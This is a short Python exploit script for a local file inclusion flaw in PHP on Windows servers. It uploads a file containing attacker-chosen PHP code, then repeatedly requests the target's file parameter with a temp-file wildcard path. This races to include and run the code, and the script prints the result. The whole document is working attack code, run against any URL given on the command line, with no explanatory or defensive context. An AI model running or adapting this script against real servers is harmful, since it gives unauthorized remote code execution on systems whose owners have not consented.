import requests
import sys

# window lfi exp  use python3 window_lfi_exp.py url php_eval
def post_file(url,php_eval):
    target_url = url
    upload_headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygVBxvNQIwyeAYMHH"
    }
    file_datas = """
------WebKitFormBoundarygVBxvNQIwyeAYMHH
Content-Disposition: form-data; name="file";

C:\Windows\php<<
------WebKitFormBoundarygVBxvNQIwyeAYMHH
Content-Disposition: form-data; name="file"; filename="testtt.txt"
Content-Type: image/jpeg

<?php echo 1313999;{}?>
------WebKitFormBoundarygVBxvNQIwyeAYMHH
Content-Disposition: form-data; name="submit"

qaq
------WebKitFormBoundarygVBxvNQIwyeAYMHH--
""".format(php_eval)
    for i in range(10000):
        post_ = requests.post(url=target_url + "?file=C:\Windows\php<<",headers=upload_headers,data=file_datas)
        if "1313999" in post_.text:
            print("result:")
            print(post_.text[post_.text.index("1313999") + 7:])
            return True
    return False

if __name__ == '__main__':
    try:
        winn = post_file(sys.argv[1],sys.argv[2])
        if winn:
            print("window success!!!")
        else:
            print("fail!")
    except:
        print("use as: exp.py  url  \"php_eval\"")
